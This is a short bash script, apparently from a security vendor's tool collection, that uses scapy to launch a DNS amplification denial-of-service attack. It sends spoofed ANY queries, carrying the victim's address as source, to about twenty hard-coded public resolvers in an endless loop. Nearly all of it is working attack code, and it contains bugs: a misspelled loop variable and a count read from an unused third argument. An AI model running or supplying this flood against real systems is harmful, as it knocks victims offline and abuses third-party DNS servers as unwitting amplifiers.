#! /bin/bash
#Creator: Andrew 'Schlpr0k' Bindner
#Company: Rapid7
#Version: 0.1
#Date: 18-Aug-17
#Description: Send a large amount of traffic to a specific victim on a particular targeted port to hopefully cause a DoS. 

#WARNING: ONCE STARTED, CLOSING THE WINDOW IS THE ONLY WAY TO KILL IT!!!


if [ -z $1 ] || [ -z $2 ]; then 
  echo Usage: ./scapy_dos_dns_amplify.sh {IP Address} {Number of Packets to Send}
  echo Example: ./scapy_dos_dns_amplify.sh 192.168.1.1 10000
  exit
fi


victim=$(echo \"$1\")
COUNTER=0
while [ $COUTNER -lt $3 ]; do 
for dns in {8.8.8.8,4.2.2.2,8.8.4.4,209.244.0.3,209.244.0.4,64.6.64.6,64.6.65.6,84.200.69.80,84.200.70.40,8.26.56.26,8.20.247.20,208.67.222.222,208.67.220.220,81.218.119.11,209.88.198.133,192.95.54.3,192.95.54.1,216.146.35.35,216.146.36.36,37.235.1.174}; do
dnsserver=\"$dns\"
scapy << EOF
send(IP(src=$victim,dst=$dnsserver)/UDP(sport=RandNum(1024,65535),dport=53)/DNS(rd=1,qd=DNSQR(qname="rapid7.com",qtype="ANY",qclass="IN")),count=100,loop=1)
EOF
done
let COUNTER=$COUNTER+1
echo $COUNTER
done
